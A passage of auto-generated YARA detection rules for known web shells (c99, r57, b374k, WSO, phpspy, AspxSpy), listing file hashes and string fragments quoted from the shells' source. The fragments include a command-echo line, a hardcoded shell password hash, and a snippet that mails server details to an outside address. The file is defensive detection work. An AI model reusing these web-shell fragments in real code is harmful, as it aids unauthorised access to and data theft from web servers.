      $s6 = "Set folders = theFolder.SubFolders" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule __indexx_447 {
   meta:
      description = "webshell - from files .asp, indexx.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
      hash2 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
   strings:
      $s1 = "objRe.MultiLine=True" fullword ascii
      $s2 = "objRe.Global=True" fullword ascii
      $s3 = "Set objRe=new RegExp" fullword ascii
      $s4 = "If IsNull(str)Or str=\"\"Then" fullword ascii
      $s5 = "objRe.IgnoreCase=True" fullword ascii
      $s6 = "Set Cat=Nothing" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _1d_devshell_448 {
   meta:
      description = "webshell - from files 1d.asp, devshell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5a1a2900ec634bb1651fff9d542491221449754289ad5a58791ee3104ccef752"
      hash2 = "f8751474732f13b4139d18f33929a7fa88ca7b255455b2fb814fbc1d61ad8a6a"
   strings:
      $s1 = "DR;.nlD+}4%+^OvJjmMrwDkULcsksnUXdY" fullword ascii
      $s2 = "?zdD+:}8L" fullword ascii
      $s3 = "N~o!xmDrW" fullword ascii
      $s4 = "64N+^OvJ?^.bwOk" fullword ascii
      $s5 = "lD+r(L" fullword ascii
      $s6 = "'EJ4r9NnxrEP" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _mumaasp_com_devshell_449 {
   meta:
      description = "webshell - from files mumaasp.com.asp, devshell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
      hash2 = "f8751474732f13b4139d18f33929a7fa88ca7b255455b2fb814fbc1d61ad8a6a"
   strings:
      $s1 = ".R;DnCD+r8%" fullword ascii
      $s2 = "mO`rj1DraYbxocsbs+UXdY" fullword ascii
      $s3 = "xORT+O3^+:" fullword ascii
      $s4 = "D-+M ZM+CO" fullword ascii
      $s5 = ".R;D+mOnr(L" fullword ascii
      $s6 = "K+XYwrV" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _devshell_EFSO_2_450 {
   meta:
      description = "webshell - from files devshell.asp, EFSO_2.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f8751474732f13b4139d18f33929a7fa88ca7b255455b2fb814fbc1d61ad8a6a"
      hash2 = "c3b029e9e7077164976a5f73399b07dd481ac41d524328f933a4cd62a36af679"
   strings:
      $s1 = "w;Y,dDXs" fullword ascii
      $s2 = "JrPxm:" fullword ascii
      $s3 = "CD+6(L" fullword ascii
      $s4 = "wED~/DXV" fullword ascii
      $s5 = ". ZM+mYnr8%" fullword ascii
      $s6 = "oY4~xPd+" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_5_source_b374k_2_6_source_451 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.5.source.php, b374k-2.6.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
   strings:
      $s1 = "<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfcontain' value='\".hss($s_sfcontain).\"' " ascii
      $s2 = "<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sdname' value='\".hss($s_sdname).\"' /></td" ascii
      $s3 = "<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfname' value='\".hss($s_sfname).\"' /></td" ascii
      $s4 = "<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfcontain' value='\".hss($s_sfcontain).\"' " ascii
      $s5 = "<td colspan='2'><input style='width:100%;' value='\".hss($s_p).\"' class='inputz' type='text' name='find' /></td></tr>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_kartal_r57_452 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash5 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "echo $font.$lang[$language.'_text1'].\": <b>\".$_POST['cmd'].\"</b></font></td></tr><tr><td><b><div align=center><textarea name=" ascii
      $s2 = "ort cols=121 rows=15>\";" fullword ascii
      $s3 = "A:active {COLOR:red; TEXT-DECORATION: none}" fullword ascii
      $s4 = "A:link {COLOR:red; TEXT-DECORATION: none}" fullword ascii
      $s5 = "A:visited { COLOR:red; TEXT-DECORATION: none}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_r57_iFX_453 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash6 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "if(isset($_GET['delete']))" fullword ascii
      $s2 = "/*  ANY MODIFIED REPUBLISHING IS RESTRICTED" fullword ascii
      $s3 = "echo ws(2).$lb.\" <a href=\".$_SERVER['PHP_SELF'].\"?tmp title=\\\"\".$lang[$language.'_text48'].\"\\\"><b>tmp</b></a> \".$rb;" fullword ascii
      $s4 = "echo ws(2).$lb.\" <a href=\".$_SERVER['PHP_SELF'].\"?delete title=\\\"\".$lang[$language.'_text49'].\"\\\"><b>delete</b></a> \"." ascii
      $s5 = "echo ws(2).$lb.\" <a href=\".$_SERVER['PHP_SELF'].\"?delete title=\\\"\".$lang[$language.'_text49'].\"\\\"><b>delete</b></a> \"." ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _angel_spy_2011_2013_2009mssql_454 {
   meta:
      description = "webshell - from files angel.php, spy.php, 2011.php, 2013.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash3 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash4 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash5 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "p('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\');\">'.$table['Name'].'</a></td>');" fullword ascii
      $s2 = "p('<td>'.$table['Update_time'].'&nbsp;</td>');" fullword ascii
      $s3 = "p('<td>'.$table['Create_time'].'&nbsp;</td>');" fullword ascii
      $s4 = "}//end mysql" fullword ascii
      $s5 = "p(\"<tr class=\\\"\".bg().\"\\\"><td colspan=\\\"\".($highver ? 9 : 7).\"\\\"><input name=\\\"saveasfile\\\" value=\\\"1\\\" typ" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _angel_2011_2013_455 {
   meta:
      description = "webshell - from files angel.php, 2011.php, 2013.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash3 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
   strings:
      $s1 = "<a href=\"javascript:g('logout');\">Logout</a> | " fullword ascii
      $s2 = "$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel" fullword ascii
      $s3 = "//echo encode_pass('angel');exit;" fullword ascii
      $s4 = "//angel = ec38fe2a8497e0a8d6d349b3533038cb" fullword ascii
      $s5 = "<td nowrap><input class=\"bt\" id=\"jumpto\" name=\"jumpto\" value=\"Jump to\" type=\"button\"></td>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_phpspy_2006_phpspy_2005_lite_456 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, phpspy_2006.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash3 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = " angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s2 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s3 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s4 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s5 = "COLOR: \"#A60000\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_c99_PSych0_c99shell_Shell__ci___Biz_was_here_c99_locus7s_c99_457 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, c99_PSych0.php, c99shell.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = " else {echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug " ascii
      $s2 = "pe=\\\"hidden\\\" name=\\\"fdbk_ref\\\" value=\\\"\".urlencode($HTTP_REFERER).\"\\\"><br><br>Attach server-info * <input type=" ascii
      $s3 = "email).\"\\\"><br><br>Message:<br><textarea name=\\\"fdbk_body\\\" cols=80 rows=10>\".htmlspecialchars($fdbk_body).\"</textarea>" ascii
      $s4 = "htmlspecialchars($fdbk_name).\"\\\"><br><br>Your e-mail: <input type=\\\"text\\\" name=\\\"fdbk_email\\\" value=\\\"\".htmlspeci" ascii
      $s5 = "replace(array(\"@\",\".\"),array(\"[at]\",\"[dot]\"),$suppmail).\"):<br><br>Your name: <input type=\\\"text\\\" name=\\\"fdbk_na" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_Crystal_SnIpEr_SA_Shell_r57_Mohajer22_458 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, Crystal.php, SnIpEr_SA Shell.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
      hash3 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "$tekst = fread($zrodlo, filesize($temp));" fullword ascii
      $s2 = "$temp=tempnam($tymczas, \"cx\");" fullword ascii
      $s3 = "$zrodlo = fopen($temp, \"r\");" fullword ascii
      $s4 = "fclose($zrodlo);" fullword ascii
      $s5 = "echo \"\".htmlspecialchars($tekst).\"\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_0_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_459 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.0.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash9 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash10 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash11 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash12 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash13 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )" fullword ascii
      $s2 = "function actionLogout() {" fullword ascii
      $s3 = "if(empty($_POST['charset']))" fullword ascii
      $s4 = "if( empty($_POST['a']) )" fullword ascii
      $s5 = "if($os == 'win')" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _G5_1n73ction_460 {
   meta:
      description = "webshell - from files G5.php, 1n73ction.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8442b9e1aa672ef4aca99eb2ee61ca7a81c3ee6e73d815c0f88d94df4c0a46c0"
      hash2 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
   strings:
      $s1 = "if (preg_match(\"/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_a" ascii
      $s2 = "$allDmns = array();" fullword ascii
      $s3 = "$allDmns[] = $vv;" fullword ascii
      $s4 = "foreach ($allLinks as $kk => $vv){" fullword ascii
      $s5 = "if(!$win){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _G5_qyt0dHv1_461 {
   meta:
      description = "webshell - from files G5.php, qyt0dHv1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8442b9e1aa672ef4aca99eb2ee61ca7a81c3ee6e73d815c0f88d94df4c0a46c0"
      hash2 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
   strings:
      $s1 = "curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8'" ascii
      $s2 = "curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8'" ascii
      $s3 = "$result['EXE'] = curl_exec($ch);" fullword ascii
      $s4 = "curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "2009032609" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _G5_itsec_462 {
   meta:
      description = "webshell - from files G5.php, itsec.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8442b9e1aa672ef4aca99eb2ee61ca7a81c3ee6e73d815c0f88d94df4c0a46c0"
      hash2 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
   strings:
      $s1 = "elseif (isset ($_GET[drop_db])){" fullword ascii
      $s2 = "if ($result!=1){" fullword ascii
      $s3 = "elseif (substr($trow[0],0,6)=='Tables')" fullword ascii
      $s4 = "if(!function_exists('db2_connect'))return 0;" fullword ascii
      $s5 = "case 'DB2':" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99_w4cking_c99_locus7s_c99_463 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99_w4cking.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash4 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "  echo \"<table border=0><tr><td><form name=\\\"c99sh_sqlquery\\\" method=POST><b>\"; if (($sql_query) and (!$submit)) {echo \"D" ascii
      $s2 = "ame=sql_tbl value=\\\"\".htmlspecialchars($sql_tbl).\"\\\"><input type=hidden name=submit value=\\\"1\\\"><input type=hidden nam" ascii
      $s3 = "uery).\"</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden " ascii
      $s4 = "eally want to\";} else {echo \"SQL-Query\";} echo \":</b><br><br><textarea name=sql_query cols=100 rows=10>\".htmlspecialchars($" ascii
      $s5 = "to\\\" value=\\\"\".htmlspecialchars($sql_goto).\"\\\"><input type=submit name=sql_confirm value=\\\"Yes\\\">&nbsp;<input type=s" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99v2_c99shell_ctt_sh_c99_w4cking_Shell__ci___Biz_was_here_c99_locus7s_c99_464 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99v2.php, c99shell.php, ctt_sh.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash4 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash5 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash6 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash7 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash8 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash9 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s3 = "if (!function_exists(\"getmicrotime\")) {function getmicrotime() {list($usec, $sec) = explode(\" \", microtime()); return ((floa" ascii
      $s4 = "  elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url a" ascii
      $s5 = " if (($act == \"paste\") or ($act == \"copy\") or ($act == \"cut\") or ($act == \"unselect\")) {echo \"<center><b>Sorry, buffer " ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _zacosmall_gfs_sh_ctt_sh_465 {
   meta:
      description = "webshell - from files zacosmall.php, gfs_sh.php, ctt_sh.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "addb8577594a550a3c7853251ea227df7af8c8a0878d3461020226bd3e1dd9ba"
      hash2 = "c8df75173ff2c9fae9980b311fbf23740b47481aec2175218d7ea99db5c31770"
      hash3 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
   strings:
      $s1 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii
      $s2 = "hn.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii
      $s3 = "$_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g3" ascii
      $s4 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii
      $s5 = "2 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\\n$b33\\n$c87\\n$d23\\n$e09\\n$f23\\n$g32\\n$h65\";" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _c66_c99v2_Shell__ci___Biz_was_here_c99_466 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash4 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "   if (in_array($sql_act,$acts)) {?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create" ascii
      $s2 = "   ?><td width=\"25%\" height=\"100%\" valign=\"top\"><a href=\"<?php echo $surl.\"act=sql&sql_login=\".htmlspecialchars($sql_lo" ascii
      $s3 = "ight=\"1\"></td></tr></table><?php }" fullword ascii
      $s4 = "or=\"#C0C0C0\"><tr><td width=\"100%\" height=\"1\" colspan=\"2\" valign=\"top\"><center><?php" fullword ascii
      $s5 = "&\"; ?>\"><b>Home</b></a><hr size=\"1\" noshade><?php" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _b374k_3_2_2_b374k_3_2_3_b374k_2_7_source_467 {
   meta:
      description = "webshell - from files b374k-3.2.2.php, b374k-3.2.3.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash2 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash3 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "ilter:\"FlipV\";}" fullword ascii
      $s2 = "#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-f" ascii
      $s3 = "#totop:hover,#tobottom:hover{opacity:0.80;}" fullword ascii
      $s4 = "#navigation{position:fixed;left:-16px;top:46%;}" fullword ascii
      $s5 = "#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-f" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _devilzShell_devshell_devilzShell_468 {
   meta:
      description = "webshell - from files devilzShell.aspx, devshell.asp, devilzShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "73c99b46c973b605d3a9d7b288ffc70c6a62cbf620ccd99b0c44876c77f8bd6e"
      hash2 = "f8751474732f13b4139d18f33929a7fa88ca7b255455b2fb814fbc1d61ad8a6a"
      hash3 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
   strings:
      $s1 = "'# greets: devilzc0der(s) and all of you who love peace and freedom" fullword ascii
      $s2 = "'# author: b374k" fullword ascii
      $s3 = "'# Jayalah Indonesiaku" fullword ascii
      $s4 = "'# ^^^^^^^^^^^^" fullword ascii
      $s5 = "'# ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _ASPXspy2__icesword_AspxSpy2014Final_111_aspx_cmd_469 {
   meta:
      description = "webshell - from files ASPXspy2.aspx, .aspx, icesword.aspx, AspxSpy2014Final.aspx, 111.aspx, aspx.aspx, cmd.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
